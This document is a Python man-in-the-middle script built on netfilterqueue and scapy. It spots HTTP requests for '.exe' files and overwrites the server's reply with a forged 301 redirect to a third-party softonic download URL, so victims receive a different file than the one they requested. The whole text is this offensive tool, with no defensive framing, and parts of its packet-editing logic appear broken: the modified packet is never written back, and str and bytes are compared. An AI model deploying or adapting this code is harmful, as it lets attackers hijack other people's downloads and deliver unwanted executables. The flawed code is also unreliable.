#!/usr/bin/env python
import netfilterqueue
from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.inet import IP, UDP, TCP
import argparse

from scapy.packet import Raw

ack_list = []


def set_load(packet, new_load):
    packet[Raw].load = new_load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return new_load


def process_packets(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(TCP):  # Check for the TCP layer
        if scapy_packet.haslayer(Raw):
            if "HTTP/1.1" in scapy_packet[Raw].load:
                print("[+] HTTP REQUEST")
                raw_data = scapy_packet[Raw].load.decode('utf-8', errors='ignore')  # Decode the raw data
                if ".exe" in raw_data:
                    print("[+] .exe Request")
                    ack_list.append(scapy_packet[TCP].ack)
            if scapy_packet[TCP].sport == 80:
                if scapy_packet[TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[TCP].seq)
                    print("Replacing File")
                    # Replace the file with a redirect response
                    set_load(packet, "HTTP/1.1 301 Moved Permanently\n"
                                     "Location: https://pdf-download-firefox.en.softonic.com/support?ext=1\n\n")
    packet.accept()


# Create a netfilterqueue object and bind it to queue 0
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packets)

try:
    print("[+] Waiting for packets...")
    queue.run()
except KeyboardInterrupt:
    print("[+] Exiting...")
